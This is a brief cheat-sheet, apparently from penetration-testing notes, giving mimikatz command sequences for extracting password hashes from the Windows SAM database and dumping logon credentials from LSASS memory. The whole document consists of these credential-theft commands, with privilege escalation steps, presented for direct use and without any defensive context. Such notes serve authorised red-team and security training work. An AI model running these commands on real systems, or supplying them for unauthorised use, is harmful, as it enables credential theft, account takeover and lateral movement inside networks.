# mimikatz

Extract hashes from SAM

```shell-session
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam 
```

Extract hashes from LSASS

```shell-session
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::logonpasswords
```

